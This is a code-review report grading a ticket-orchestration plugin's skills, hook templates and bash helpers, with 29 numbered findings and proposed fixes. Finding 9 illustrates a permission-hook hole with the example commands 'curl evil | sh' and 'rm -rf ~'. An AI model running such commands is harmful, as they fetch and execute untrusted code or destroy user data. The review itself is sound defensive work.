# Slice 06 — Orchestrate / Kickoff / Wrap / Review-and-commit / Init-orchestration / Fix-ticket

## Slice summary

- **What it is:** the ticket-lifecycle core of the plugin. `/kickoff` handles intake and planning. `/orchestrate` is a router (`SKILL.md`) plus 14 phase files: fetch → scope → worktree → PM/TL → plan → DAG → IC execution → TL review → QA → ship → wrap. `/wrap-ticket` does close-out and remote pruning. `/review-and-commit` runs the council diff-mode review and the commit gate. `/debug ticket` uses the fix-ticket backend. `/setup orchestration` uses the init-orchestration backend: it writes settings.json and 8 hook templates (task-completed council gate, escalation gate, bash-compress, and others). Also in scope: the bash helpers `dag-lib.sh`, `task-store.sh`, `prune-remote.sh`, `normalize-hook-paths.sh`, `signing-sandbox.sh`, `sweep-legacy-orphans.sh` and `disclose-force-overwrite.sh`, plus user docs and the runbook.
- **Overall grade: C+.** The helper scripts are well defended and well tested: 8 of 9 test harnesses pass (~390 assertions), shellcheck is clean apart from false positives, and `bash -n` passes. The LLM-facing protocol has several real execution bugs, one red test on master, and several macOS portability holes that switch safety gates off without any warning.
- **Biggest risk 1: gates bypassed on stock macOS.** The emitted `task-completed.sh` reads stdin through `timeout 1 cat`. Stock macOS has no `timeout`, so the task id comes back empty and the hook exits 0. The council quality gate is bypassed silently (reproduced). `dag-lib.sh` needs bash 4.3+ (`declare -A`, `${stack[-1]}`). `task-store.sh` needs `flock`, which is util-linux only. As a result the whole DAG/task-store path fails on stock macOS.
- **Biggest risk 2: task-graph key mismatch.** Dependencies are keyed by the plan ordinal (`<ID>-N`). Task files are keyed by the integer that TaskCreate returns (`<ID>-<task_id>`). Once TaskCreate IDs are not 1..n in plan order, dependent tasks never become ready and the run stalls with no error.
- **Biggest risk 3: memory never loads in DB mode.** In 6 fences in this slice (90 repo-wide), `MEMDB="$MROOT/..."` is assigned before `MROOT` is resolved in the same fresh-shell fence. In SQLite mode, kickoff, orchestrate and wrap-ticket therefore never read the memory DB. Skill-lint does not catch this pattern.
- **Biggest risk 4: `review-and-commit` Step 5 finalize is broken.** It uses `\  # lint-ok: C1`: a backslash followed by spaces and a comment ends the command instead of continuing it. `--evidence-file` then runs as its own command (exit 127, reproduced).
- **Biggest risk 5: `router-static-test.sh` is red on master** (T10 fails because of `02-scope.md:6`, added in v1.17.0). It, and 7 of the 9 test harnesses in this slice, are not wired into CI; only `prune-remote-test.sh` runs in `smoke.yml`.
- **Token cost:** the 23-line PDH stanza appears 78× across the slice's markdown, and the model-map resolve boilerplate block appears 17×. `init-orchestration/SKILL.md` is 2,157 lines, most of it verbatim hook bodies. `kickoff/SKILL.md` is 971 lines.
- **Docs drift:** `docs/commands/kickoff.md` says kickoff "does not create a worktree", but the skill's Step 1b makes the worktree mandatory. The orchestrate docs name the branch `feat/<ID>-<slug>`, but the code uses `feat/<ID>`. The review-and-commit docs say a clean run "commits automatically", but the skill always asks and HALTs outside `.worktrees/`.

## Per-file review

| File | Lines | Purpose (short) | Verdict | Findings (concise, with line numbers) |
|---|---|---|---|---|
| docs/commands/kickoff.md | 79 | User doc for /kickoff | Issue | L71: "It does not create a worktree", which contradicts the mandatory Step 1b worktree in the skill (F13). The step list omits Step 1b and the Step 4b API-verify gate. The example summary lacks the Worktree and Branch lines the skill prints. |
| docs/commands/orchestrate.md | 96 | User doc for /orchestrate | Minor | L59: branch `feat/<ISSUE-ID>-<slug>`, but worktree-lib uses `feat/<slug>` (L210). Numbering has two items numbered 12 (L67–68). L57 order (Linear → backlog → freeform) is correct. |
| docs/commands/review-and-commit.md | 104 | User doc for /review-and-commit | Issue | L57–62 and L88–91 describe auto-commit and a y/n prompt only when findings exist. The skill's §7.2–7.4 always asks, HALTs when cwd is outside `.worktrees/`, and routes to /kickoff. L103–104 claim /wrap-ticket and /orchestrate run review-and-commit; neither does (grep finds no reference). L19/36 example `/tmp/review…` is illustrative only. |
| docs/commands/wrap-ticket.md | 93 | User doc for /wrap-ticket | Minor | L75 "queues distillation", but the skill only prints a hint (SKILL L277–281). Otherwise matches the skill, including the file-store-authoritative wording. |
| docs/runbooks/orchestrate.md | 242 | Worked runbook | Minor | L100 shows the `feat/POC-123-batch-export` branch naming (stale). L219 anchor `#memory-configuration-memory-config` is broken; the heading "Memory Configuration — `/memory config`" slugs to `#memory-configuration--memory-config` (README uses the correct form). L55 inline ticket text passed to /orchestrate is not in the documented usage. |
| skills/fix-ticket/SKILL.md | 355 | /debug ticket backend protocol | Issue | L31 example id `AUDIT-P0.8`: worktree-lib rejects dots (worktree-lib.sh:197), so Step 2 fails (F17). L118–120 comment promises a "require it is a git worktree" check, but the code only runs `[ -d ]`. L48 "README version/changelog" is stale (AGENTS: README has no versions). PDH stanza ×4 and model-map boilerplate ×3. L347 "Distinct from /debug" is confusing because this file *is* `/debug ticket`. |
| skills/fix-ticket/prompts/implement.md | 60 | Implement prompt | OK | Clear. Frontmatter present. L32 README-version wording is stale, same as the skill. |
| skills/fix-ticket/prompts/premise.md | 49 | Premise prompt | Minor | L6 says "Spawned as ic5", but the skill spawns `debugger` (ic5 only as fallback). SPEC-028 L16 also says ic5, so there is spec/skill drift. |
| skills/fix-ticket/prompts/refute.md | 64 | Refuter prompt | OK | Good anti-`git checkout` constraints. |
| skills/fix-ticket/templates/report.md | 51 | Report template | OK | Placeholders beyond the Step 7 table (`PREMISE_*`, `IMPL_SECTION`) are covered by the prose. |
| skills/fix-ticket/workflow.js | 215 | Non-invoked Workflow reference | Minor | L180: `t.lenses` passed as the string "a,b" (the CLI form) makes `.map` throw. L214 `verification_mode` is always 'full'. L5 cites `.claude/p0-fix-workflow.js`, which does not exist. Nothing invokes the file (reference only). |
| skills/init-orchestration/SKILL.md | 2157 | /setup orchestration backend + 8 hook templates | Major | Emitted task-completed hook L718: `timeout 1 cat` with no fallback bypasses the gate on macOS (F1). Memory-capture L1067: same `timeout` problem, and L1082 `${TOOL_NAME,,}` needs bash 4+ (F6). Bash-compress L1131–1143: `permissionDecision:allow` on a prefix match, so `make x; curl … \| sh` is auto-allowed; the "bounded" claim is false (F9). Step 7 L2059–2068: `$CONTENT` is never set in its fence, so an empty row is inserted, and it uses git-common-dir MROOT, contradicting the L1987 single-root rule (F11). L324: stale reference to "Permission batching under `dontAsk`". Step 9 summary L2113–2126 omits escalation-gate.sh. L2129–2130 and L2154: "customize/uncomment test runner" and "exits 0 by default" are false for the template. L654: references a spike plan absent in target repos. 2,157 lines, PDH ×9. |
| skills/init-orchestration/check-hook-templates.sh | 92 | Release gate: extract + `bash -n` templates | Minor | Passes. `bash -n` alone cannot catch bash-4-only syntax (`${x,,}`) or missing tools (`timeout`); see E4. |
| skills/init-orchestration/disclose-force-overwrite.sh | 140 | AC5 disclosure helper | Minor | L138–143: `shift 2` on a trailing flag with no value loops forever (reproduced: `--new x --key`, timeout rc 124). L112 doc "missing key and --new empty → exit 1" cannot happen (usage rejects empty --new). A missing key is disclosed as a force overwrite with a backup, contradicting SKILL L496 "adding a missing key is not a force-overwrite". |
| skills/init-orchestration/escalation-gate-test.sh | 247 | Bite tests for the escalation-gate hook | Minor | PASS=40 FAIL=0. Not in CI. No `..`-traversal, relative-path or `realpath`-absent case. Naming (`*-test.sh`) differs from its sibling `test-*.sh` files. |
| skills/init-orchestration/normalize-hook-paths.sh | 309 | CDT-69 hook-path rewrite | Minor | Plan and apply duplicate the same Python (L93–178 vs L233–306). The plan phase skips commands containing tab/newline without disclosing them, but the apply phase rewrites them anyway (silent-overwrite edge). `json.dump` reformats the whole file (ASCII-escapes). Has the same `shift 2` hang as disclose. |
| skills/init-orchestration/signing-sandbox.sh | 411 | CDT-211 signing sandbox merge | Minor | Option 3 (L317–321) only disables `commit.gpgsign`, so a repo detected via `tag.gpgsign` alone stays unmitigated. Same `shift 2` hang on a trailing flag. Otherwise solid; 88 tests pass. |
| skills/init-orchestration/sweep-legacy-orphans.sh | 236 | CDT-76 legacy-orphan sweep | OK | Correct and bash-3.2-safe. Same `shift 2` trailing-flag hang pattern (L51–54). |
| skills/init-orchestration/test-disclose-force.sh | 171 | Tests for disclose helper | Minor | PASS=33. Test values use the retired `dontAsk` posture (harmless). L164 turns on `set -e` although it was never set before. Not in CI. |
| skills/init-orchestration/test-normalize-hook-paths.sh | 249 | Tests for normalize | OK | PASS=32. Not in CI. |
| skills/init-orchestration/test-orch-allowlist.sh | 139 | Greenfield allow ⊇ matrix | Minor | PASS=24. L12 comment says "Cell C" (the winner is Cell D). L86–101 needle check (`'Read'`, `'Write'`) is trivially satisfied, so it is a weak test. Not in CI. |
| skills/init-orchestration/test-signing-sandbox.sh | 430 | Tests for signing | OK | PASS=88. Isolates the git config stack well. Not in CI. |
| skills/init-orchestration/test-sweep-legacy-orphans.sh | 235 | Tests for sweep | OK | PASS=47. Not in CI. The `assert_*` helpers are copied into 7 test files (E5). |
| skills/kickoff/SKILL.md | 971 | /kickoff intake + planning | Major | L119–124, L138–143, L157–162: MEMDB is assigned before MROOT, so DB memory is never read (F3). L590 `grep -oP` is GNU-only (F15). L806: `echo "\n## Task Map\n"` writes literal `\n`, and `$WT_PATH` is unquoted (F16). L778–789: the same plan-N vs TaskCreate-id key mismatch as orchestrate (F2). The plan is written into the worktree (L674), but `resume-state.sh` globs `$MROOT/.claude/plans` (F14). @finder is used here, but the AGENTS roster lists finder for /council and /bug-hunt only. PDH ×14, model-map boilerplate ×4. |
| skills/orchestrate/SKILL.md | 59 | Router (≤80 lines) | OK | Good progressive-disclosure design. The Arguments list is duplicated with 00-resolve.md and the docs. |
| skills/orchestrate/dag-lib.sh | 233 | DAG cycle check / ready-set | Issue | L101–102 `declare -A` and L134–135 `${stack[-1]}` need bash ≥4.3, so the script fails on macOS /bin/bash 3.2 (F4). L42/L51: usage and missing-jq exit 1, the same code as "cycle found", so callers print "circular dependency detected" for a missing jq or a missing argument (F18). No dedicated test; only epic/test.sh touches it. |
| skills/orchestrate/router-static-test.sh | 320 | Static protocol test | Issue | **Currently FAILS**: `FAIL: T10 02-scope.md bad-form` (PASS=15 FAIL=1), caused by `02-scope.md:6` from v1.17.0 (F7). Not in CI, which is why the regression went unnoticed. |
| skills/orchestrate/steps/00-resolve.md | 185 | Step 0 roots/flags/resume | Issue | L65–69: MEMDB before MROOT (F3). L153: `[ "$ACCUM" -gt 0 ]` errors if resume-state prints nothing. The argument docs duplicate SKILL.md and the command docs. |
| skills/orchestrate/steps/01-fetch.md | 25 | Step 1 source resolution | Minor | L20 "Linear lifecycle below" points at a section in 11-ship.md, which is not loaded under the load-current-step-only protocol. L8 `linear_getIssue` is a stale tool name (the Linear MCP uses `get_issue`). |
| skills/orchestrate/steps/02-scope.md | 61 | Scope gate + auto-tier | Issue | L6 breaks router-static-test T10 (F7). L52: "§ below" points at cross-cutting.md. |
| skills/orchestrate/steps/03-worktree.md | 105 | Worktree + glossary 3b | Minor | L87 `git add CONTEXT.md` errors when only `docs/domain/CONTEXT.md` exists (noise only). Otherwise consistent. |
| skills/orchestrate/steps/04-kickoff.md | 147 | PM+TL parallel / light scoper | Minor | L40 plan path is relative (`.claude/plans/…`), with no worktree/MROOT contract, unlike kickoff's absolute-path contract (F14). Diverges from kickoff Step 2 (no finder, no API-assumption list or Step 4b gate). |
| skills/orchestrate/steps/05-questions.md | 23 | Open questions | Minor | The standard path (L9–20) has no autopilot branch, so an autopilot run waits for the user here. Every other gate has an autopilot envelope (unverified whether 02-scope's self-answer covers this case). |
| skills/orchestrate/steps/06-design.md | 231 | TL plan, approve, 6b, 6c council | Issue | L41/L48: spec and plan paths are relative, with no worktree contract and no spec-commit instruction. 6b L142 says "couple with the Step 6 spec commit", but that commit is never defined (F14). L65: the substring classifier (`auth` matches "author", also `session`, `token`) marks most tickets auth-secrets, triggering a costly council. |
| skills/orchestrate/steps/07-tasks.md | 109 | DAG + task-store | Major | L11 vs L101/L104: dependencies map plan "Task N" to `<ID>-N`, but files are created as `<ID>-<TaskCreate id>`. They match only when TaskCreate returns 1..n in plan order (F2). L104's claim that a bare key "would silently re-mark every dependent as ready" is backwards; the effect is a stall. L23–33: "halt" is only a comment, and the fence continues. |
| skills/orchestrate/steps/08-execute.md | 481 | Spawn, monitor, CI-watch, stint emit | Minor | L164–170: reconciliation says TaskUpdate only. The `task-store.sh update-status` mirror needed by ready-set is only in 09-review, so if 09 is not loaded, ready-set stalls. Long; the autopilot envelope text is repeated 5× (L206–286). |
| skills/orchestrate/steps/09-review.md | 325 | TL review, council gate, simplify | Minor | L271–290: the CI-watch cleanup fence uses `$TASK_ID`, which is never set in the fresh shell (should be a `<TASK_ID>` placeholder). Very long council-tier exposition (L139–247). |
| skills/orchestrate/steps/10-qa.md | 70 | QA + spec alignment | Minor | L50: "Stint-end outcome emit" block lives in 08-execute.md (not loaded under the router protocol). L47: "Repeat until QA passes" has no cap (compare the 3-round deadloop in Step 9). |
| skills/orchestrate/steps/11-ship.md | 441 | Ship, Linear, tracking, cleanup | Issue | L371–384: `SHIP_START` must survive from before the squash, but the squash fence (L338–355) never records it and the check fence is a fresh shell, so the check exits 64 on the interactive path unless the value is hand-substituted (F12). L161: "exit 64" wording vs L40, which treats any non-zero as blocked (minor). |
| skills/orchestrate/steps/12-wrap.md | 69 | Wrap banner + friction | OK | Consistent with Step 11 lifecycle. |
| skills/orchestrate/steps/cross-cutting.md | 152 | Rules, notifications, discipline | Issue | L146 "No git repo: warn; skip worktree, work in current directory" contradicts kickoff Error Handling (HARD ERROR, CDT-105) and 03-worktree halt semantics (F19). |
| skills/orchestrate/task-store-test.sh | 359 | task-store + hook shadow-safe tests | Minor | PASS=33. No test of `create`/depends_on or of dag-lib ready-set against compound keys. Not in CI. |
| skills/orchestrate/task-store.sh | 202 | Task JSON store | Issue | L91/L148 `flock` does not exist on macOS; under `set -e` every create/update fails (exit 127) (F5). L124 prints "created:" after "upserted:" (cosmetic). |
| skills/review-and-commit/SKILL.md | 397 | Council diff-mode review + commit gate | Major | L207: `\  # lint-ok: C1` breaks the line continuation, so the finalize args run as a separate command (F8, reproduced). L130/L207 `$PLAN_FILE` crosses fences (empty in a fresh shell). L209 `$degraded` is never a shell var. L58: `--include='*.{py,js,…}'` matches nothing because grep does not brace-expand (reproduced), so `--impact` finds no callers (F10). L347 claims /orchestrate calls this skill, but no step does. |
| skills/wrap-ticket/SKILL.md | 628 | Close-out | Issue | L195–199 and L229–233: MEMDB before MROOT (F3). L158–169: reads `context.md` and the plan from `$WTROOT` (the cwd tree), not `$WORKTREE_PATH`, so learnings are lost when run from main (F20). L169/L306/L530/L551 use `$TICKET_ID`, unset in their fences (lint suppressed with C1). L234: LLM-substituted learnings inside a double-quoted bash string, so a backtick or `$(` in learnings executes (F21). Step order 5.5 before 5, and "6.x". L418 `feat/<ID>-*` naming. |
| skills/wrap-ticket/prune-remote-test.sh | 268 | Prune tests (CI-wired) | OK | PASS=61. Argument order of `assert_eq` (name,want,got) differs from the other suites. No stale-tracking-ref case. |
| skills/wrap-ticket/prune-remote.sh | 335 | Safe remote feat/* prune | Minor | L127–138/L259: safety is judged on the local branch or a possibly stale origin tracking ref (no fetch). `git push --delete` has no lease, so remote-only commits can be deleted (F22). Otherwise bash-3.2-safe and well structured. |

## Findings

1. **[P1] Council TaskCompleted gate silently bypassed without `timeout` (stock macOS)**: `skills/init-orchestration/SKILL.md:718`
   Evidence: `STDIN_JSON=$(timeout 1 cat 2>/dev/null || true)`. Repro with PATH lacking `timeout`: a task with `requires_council:true` and no index gives `with timeout rc=2`, but `no-timeout rc=0`. The same pattern appears at L975 (stop-review) and L1067 (memory-capture exits 0 immediately). `skills/handoff/precompact-capture.sh:90` already guards with `command -v timeout`.
   Fix: `if command -v timeout >/dev/null; then STDIN_JSON=$(timeout 1 cat); elif command -v gtimeout …; else STDIN_JSON=$(head -c 1048576); fi`. The harness always closes stdin, so a bounded `head -c` is safe. Add a test that runs the hook with `timeout` removed from PATH.

2. **[P1] Task-graph dependency keys ≠ task-store keys**: `skills/orchestrate/steps/07-tasks.md:11,101,104`; `skills/kickoff/SKILL.md:778-789`
   Evidence: the DAG maps plan "Task N" to `<ISSUE-ID>-N`, while create uses `<ISSUE-ID>-<task_id>` "the integer returned by TaskCreate". `dag-lib.sh ready-set` (L207–211) requires every dep id to be completed. When TaskCreate IDs are not 1..n (a second ticket in a session, or /kickoff followed by /orchestrate; the docs example itself shows `id:41..43`), dependents never become ready and the run stalls with no error.
   Fix: pick one key namespace. Either key files by plan ordinal (`<ID>-N`) and record the TaskCreate id as a field, or build the dependency map *after* TaskCreate from a plan-N→task_id table. Add a test in task-store-test with non-contiguous ids.

3. **[P1] DB-mode memory never loads (MEMDB assigned before MROOT in a fresh-shell fence)**: `skills/kickoff/SKILL.md:121,140,159`; `skills/orchestrate/steps/00-resolve.md:66`; `skills/wrap-ticket/SKILL.md:196,230`
   Evidence: the fence starts with `WTROOT=…; MEMDB="$MROOT/.claude/memory/memory.db"` and only then resolves `MROOT`. MROOT is unset in a fresh shell, so the path is `/.claude/memory/memory.db`, `-f` fails, and the code falls back to `memory.md`. In SQLite mode, orchestrator and TL/PM memory is never loaded, and wrap-ticket's learnings write (L230–243) goes to the `.md` fallback instead of the DB. 90 occurrences repo-wide (`grep -A2 '^WTROOT=' | grep -c 'MEMDB="\$MROOT'`). `skill-lint` passes (rc=0).
   Fix: swap the order (resolve `_gc/MROOT` first) with a scripted fix across the repo. Add a skill-lint rule that flags a variable used before assignment within a fence.

4. **[P1] `dag-lib.sh` requires bash ≥4.3**: `skills/orchestrate/dag-lib.sh:101-102,134-135`
   Evidence: `declare -A ADJ`, `local top="${stack[-1]}"; unset 'stack[-1]'`. `#!/usr/bin/env bash` resolves to /bin/bash 3.2 on stock macOS, so `check-cycle` errors with rc≠0/1 and kickoff/orchestrate print "cycle gate could not run" and halt. No bash-version guard exists anywhere except a comment in doctor.sh:140.
   Fix: rewrite the DFS in jq or awk (portable), or add a `BASH_VERSINFO` guard that fails with a clear message, plus a doctor check.

5. **[P1] `task-store.sh` requires `flock` (not on macOS)**: `skills/orchestrate/task-store.sh:91,148`
   Evidence: `( flock -x 9 … ) 9>"$LOCK"` under `set -euo pipefail` returns 127 on macOS, so every create/update fails, and orchestrate is told to "surface the error immediately".
   Fix: use `if command -v flock >/dev/null; then flock -x 9; else` a mkdir-lock fallback with retry; `fi`. Alternatively, rely on the atomic tmp+mv, which is already present.

6. **[P2] `memory-capture.sh` template uses bash-4 `${VAR,,}`**: `skills/init-orchestration/SKILL.md:1082`
   Evidence: `OBSERVATION="${TOOL_NAME,,} $FILE_PATH"` is a "bad substitution" on bash 3.2. It is currently masked by finding 1 (the hook exits earlier).
   Fix: `$(printf '%s' "$TOOL_NAME" | tr '[:upper:]' '[:lower:]')`.

7. **[P1] `router-static-test.sh` is red on master**: `skills/orchestrate/steps/02-scope.md:6`
   Evidence: `bash skills/orchestrate/router-static-test.sh` prints `FAIL: T10 02-scope.md bad-form`, `PASS=15 FAIL=1`. Line 6 (`` `ORCH_TIER` S/M/L … is **not** `budget.tier` ``) is not an allowed form. It was added in `11da8af feat: v1.17.0`.
   Fix: reword L6 to avoid the bare token (e.g. "the pipeline tier is not `budget.tier`"). Wire `router-static-test.sh` into `.github/workflows/smoke.yml`.

8. **[P1] review-and-commit finalize command is split by a commented line continuation**: `skills/review-and-commit/SKILL.md:207`
   Evidence: `"$ENGINE_SH" finalize --plan-file "$PLAN_FILE" \  # lint-ok: C1`. The repro prints `A --plan x` and then `bash: line 2: --evidence: command not found`, rc=127. So `--evidence-file`, `--judge-output` and `--verification-mode` never reach the engine. `$PLAN_FILE` (set in the Step 3 fence) and `$degraded` are also empty in a fresh shell. The same pattern exists in `commands/council.md` and `skills/memory-recall/SKILL.md` (out of slice).
   Fix: move `# lint-ok: C1` to its own line above the command; make Step 5 re-derive `PLAN_FILE` (or pass it as a literal placeholder); replace `${degraded:+…}` with an explicit `<if degraded: --verification-mode self-verified>` placeholder.

9. **[P2] bash-compress grants `permissionDecision:"allow"` for arbitrary chained commands**: `skills/init-orchestration/SKILL.md:1131-1157`
   Evidence: `case "$COMMAND" in make\ *|make) NOISY=true` also matches `make x; curl evil | sh` and `npm test && rm -rf ~`, which are then returned with `permissionDecision":"allow"`. The comment (L1151–1152) and the permission-batching text (L47–48) claim this is "bounded to the hardcoded NOISY … allowlist". The practical impact is reduced because the greenfield allow already contains `Bash(*)` and the sandbox is on, but projects with a narrower allow list are widened.
   Fix: reject commands containing `;`, `&&`, `||`, `|`, `` ` ``, `$(` or newlines before setting `NOISY=true`. Alternatively, emit `updatedInput` without `permissionDecision` when the command is compound.

10. **[P2] `--impact` caller search matches nothing**: `skills/review-and-commit/SKILL.md:58`
    Evidence: `grep -rl --include='*.{py,js,ts,go,rs,sh}'`; grep's `--include` does not brace-expand. Repro: a file `d/a.py` containing `foo` gives `grep rc=1` (no match).
    Fix: use repeated `--include='*.py' --include='*.js' …`.

11. **[P2] Step 7 orchestrator-memory DB seed inserts an empty row and uses the wrong root**: `skills/init-orchestration/SKILL.md:2054-2068`
    Evidence: `python3 … "$MEMDB" "$CONTENT"`, but `CONTENT` is never assigned in the fence, so the DELETE removes the old seed and INSERTs `''`. The fence resolves MEMDB via `--git-common-dir`, directly after L1987 mandates `--show-toplevel` for Step 7 "all-or-nothing".
    Fix: assign `CONTENT` from the baseline block (a quoted heredoc into a variable, or have Python read a Write-tool temp file), and use `PROJ_ROOT`.

12. **[P2] Interactive master-land ship-history gate always exits 64**: `skills/orchestrate/steps/11-ship.md:338-384`
    Evidence: item 1 says to record `SHIP_START=$(git rev-parse HEAD)` "before the squash commit", but the squash template never does. The check fence is a fresh shell, so `SHIP_START="${SHIP_START:-${SHIP_START_SHA:-}}"` is empty and it exits 64.
    Fix: add `SHIP_START=$(git rev-parse HEAD); echo "SHIP_START=$SHIP_START"` to the squash fence and use a literal `<SHIP_START>` placeholder in the check fence.

13. **[P2] Kickoff docs contradict the mandatory worktree**: `docs/commands/kickoff.md:71`
    Evidence: "It does not create a worktree", while `skills/kickoff/SKILL.md:205-211` says "This step is **mandatory**", and the Error Handling section treats a missing git repo as a HARD ERROR.
    Fix: update the doc (steps list, summary sample with Worktree/Branch, Step 4b API-verify gate).

14. **[P2] Plan/spec location contract is inconsistent across kickoff → orchestrate → resume**: `skills/kickoff/SKILL.md:674`; `skills/orchestrate/steps/04-kickoff.md:40`, `06-design.md:41,48`; `skills/autopilot/resume-state.sh:108`
    Evidence: kickoff writes the plan to `<WT_PATH>/.claude/plans/…`. Orchestrate tells the TL a relative `.claude/plans/…` (whatever cwd the agent has). resume-state globs `$MROOT/.claude/plans`. Orchestrate Step 6 has no spec-commit step even though 6b references "the Step 6 spec commit".
    Fix: choose one plan home (MROOT write-through, per the AGENTS process-tracker rule, is the likeliest), state it absolutely in both skills, and add an explicit spec-commit fence in orchestrate Step 6.

15. **[P2] GNU-only `grep -oP`**: `skills/kickoff/SKILL.md:590`
    Evidence: `ls "$WT_PATH/specs/core/" | grep -oP 'SPEC-\K\d+'`; BSD grep has no `-P`.
    Fix: `ls … | sed -n 's/^SPEC-\([0-9]*\).*/\1/p' | sort -n | tail -1`.

16. **[P2] Task-map append writes literal `\n` and an unquoted path**: `skills/kickoff/SKILL.md:806`
    Evidence: `echo "\n## Task Map\n" >> $WT_PATH/.claude/plans/<plan-file>.md`.
    Fix: `printf '\n## Task Map\n\n' >> "$WT_PATH/.claude/plans/<plan-file>.md"`.

17. **[P2] fix-ticket's documented example id cannot get a worktree**: `skills/fix-ticket/SKILL.md:31`
    Evidence: example `AUDIT-P0.8`; `skills/worktree-lib.sh:197` rejects anything outside `^[A-Za-z0-9_-]+$`. Step 2 also only checks `-d` despite the L118–119 comment.
    Fix: change the example (e.g. `AUDIT-P0-8`) or sanitize dots to `-` before `ensure`. Add a `git -C "$WORKTREE" rev-parse --is-inside-work-tree` check for user-supplied `--worktree`.

18. **[P3] dag-lib exit-code overload**: `skills/orchestrate/dag-lib.sh:42,51`
    Evidence: `usage()` and missing jq both `exit 1`, the same as "cycle found". Callers (07-tasks L23, kickoff L730) then print "circular dependency detected".
    Fix: usage/dependency errors use exit 2/64.

19. **[P2] Contradictory "no git repo" behavior**: `skills/orchestrate/steps/cross-cutting.md:146`
    Evidence: "warn; skip worktree, work in current directory", while `skills/kickoff/SKILL.md:920-925` says "HARD ERROR — halt … do NOT fall back to pwd … reintroduces the master-commit defect CDT-105".
    Fix: align orchestrate with kickoff (halt).

20. **[P2] wrap-ticket harvests learnings from the wrong tree**: `skills/wrap-ticket/SKILL.md:158-169`
    Evidence: `cat $WTROOT/.claude/memory/$agent/context.md`, where WTROOT is `show-toplevel` of cwd, not Step 0's `$WORKTREE_PATH`. `$TICKET_ID` is unset at L169 (lint suppressed), so `grep -wF ""` matches every plan.
    Fix: re-derive the worktree via `epic-lib resolve-child-worktree`/`.worktrees/<ID>` in that fence and use it; set `TICKET_ID="<TICKET-ID>"`.

21. **[P2] LLM-substituted free text inside double-quoted bash**: `skills/wrap-ticket/SKILL.md:234`
    Evidence: `CONTENT="<the new learnings section …>"`. Learnings containing a backtick, `$(` or `"` are executed or broken when the model fills the template (the SKILL itself cites a `LIKE '%'` example). The implement prompt explicitly warns about this class.
    Fix: have the model Write the learnings to a `mktemp` file and read it with `CONTENT=$(cat "$F")`, or use a quoted heredoc (`<<'EOF'`).

22. **[P2] Remote prune can delete remote-only commits (stale ref, no lease)**: `skills/wrap-ticket/prune-remote.sh:127-138,259`
    Evidence: `resolve_branch_ref` prefers `refs/heads/<name>` and otherwise uses the local tracking ref, with no `git fetch`. `git push origin --delete "$name"` has no expected-SHA guard. If a collaborator pushed to `feat/X` after the last fetch, `is_safe` evaluates old commits, reports "safe", and deletes the newer remote tip.
    Fix: evaluate `refs/remotes/origin/<name>` after `git fetch origin <name>` (fail-open on network errors), and delete with `git push --force-with-lease=<name>:<checked-sha> origin --delete <name>` (or `ls-remote`-compare before delete). Add a fixture test for the divergence case.

23. **[P3] Infinite loop on a trailing value-less flag**: `disclose-force-overwrite.sh:138-143`, `normalize-hook-paths.sh:44-46`, `signing-sandbox.sh:54-62`, `sweep-legacy-orphans.sh:51-54`
    Evidence: `timeout 3 bash disclose-force-overwrite.sh --new x --key` returns rc=124 (hung). `shift 2` with $#=1 fails and does not shift.
    Fix: `[ $# -ge 2 ] || usage` before each `shift 2` (prune-remote.sh already does this).

24. **[P3] Test harnesses not wired to CI**: `.github/workflows/smoke.yml`
    Evidence: only `prune-remote-test.sh` from this slice runs in CI. `router-static-test`, `task-store-test`, `escalation-gate-test` and the 5 init-orchestration `test-*.sh` do not, which is how finding 7 landed.
    Fix: add one CI job that runs every `*-test.sh`/`test-*.sh` under `skills/init-orchestration` and `skills/orchestrate`.

25. **[P3] Stale text in init-orchestration**: `SKILL.md:324` ("Permission batching under `dontAsk`"; the heading is "Permission batching (CDT-68…)" and the posture is now `auto`), `SKILL.md:2113-2126` (summary omits escalation-gate.sh), `SKILL.md:2129-2130,2154` ("uncomment test runner", "exits 0 by default until customized"; the template has no such stubs and does exit 2).
    Fix: edit the text.

26. **[P3] Docs drift (branch naming, review-and-commit behavior, anchors)**: `docs/commands/orchestrate.md:59,67-68`; `docs/runbooks/orchestrate.md:100,219`; `docs/commands/review-and-commit.md:57-62,88-91,103-104`; `skills/review-and-commit/SKILL.md:347`
    Fix: `feat/<ISSUE-ID>`; renumber; anchor `#memory-configuration--memory-config`; describe always-ask plus the worktree HALT; drop the "orchestrate/wrap-ticket run review-and-commit" claims.

27. **[P3] Cross-step references break the load-current-step-only protocol**: `01-fetch.md:20`, `02-scope.md:52`, `10-qa.md:50` (Stint-end block lives in `08-execute.md`), `08-execute.md:164-170` (update-status mirror only in `09-review.md:252-260`)
    Fix: name the target file explicitly ("see `steps/cross-cutting.md` § Passive notifications"), or move shared blocks (stint-end emit, task-store mirror) into `cross-cutting.md`, which is loaded once.

28. **[P3] Minor fix-ticket/premise drift**: `skills/fix-ticket/prompts/premise.md:6` and `specs/core/SPEC-028-fix-ticket-workflow.md:16` say "ic5", but the skill spawns `debugger`. `workflow.js:5` cites the nonexistent `.claude/p0-fix-workflow.js`. `workflow.js:180` breaks on a string `lenses`.

29. **[P3] Escalation-gate path normalization absent on macOS**: `skills/init-orchestration/SKILL.md:1694-1697`
    Evidence: `realpath -m` is GNU-only. This is documented as honest limit #4, but the practical effect is that on every stock Mac `..` traversal is never normalized. The test suite has no traversal case.
    Fix: fall back to `python3 -c 'import os,sys;print(os.path.normpath(sys.argv[1]))'` (python3 is already a hook dependency elsewhere). Add a T-case.

## Enhancement proposals

1. **Centralize PDH + model-map boilerplate (effort M, impact high).** There are 78 copies of the ~1,100-char PDH one-liner and 17 copies of the 9-line model-map rule block in this slice alone, roughly 30–40k tokens of repeated text across kickoff and the orchestrate steps. Define the rule block once (e.g. in `cross-cutting.md`, and in `skills/model-map/SKILL.md` for kickoff) and reference it with a one-line `Before spawning @X: run the Model-map fence (cross-cutting § Model map) with AGENT=X`. For PDH, a sourced-free `resolve.sh <relpath>` helper would reduce each fence to one PDH line plus one call.
2. **Move hook bodies out of `init-orchestration/SKILL.md` into `skills/init-orchestration/hooks/*.sh` (effort M, impact high).** This cuts SKILL.md from 2,157 to about 900 lines. `check-hook-templates.sh`, `task-store-test.sh` and `escalation-gate-test.sh` would read the real files instead of regex-extracting fenced blocks, and shellcheck would run on the real files. Setup would `cp` them rather than the LLM re-typing 700 lines of bash through the Write tool, which is error-prone and expensive.
3. **Portability test lane (effort M, impact high).** Add a CI job on `macos-latest` (bash 3.2, BSD userland, no `timeout`/`flock`/GNU grep) that runs the slice's test harnesses and the extracted hooks. It would have caught findings 1, 4, 5, 6, 15 and 29.
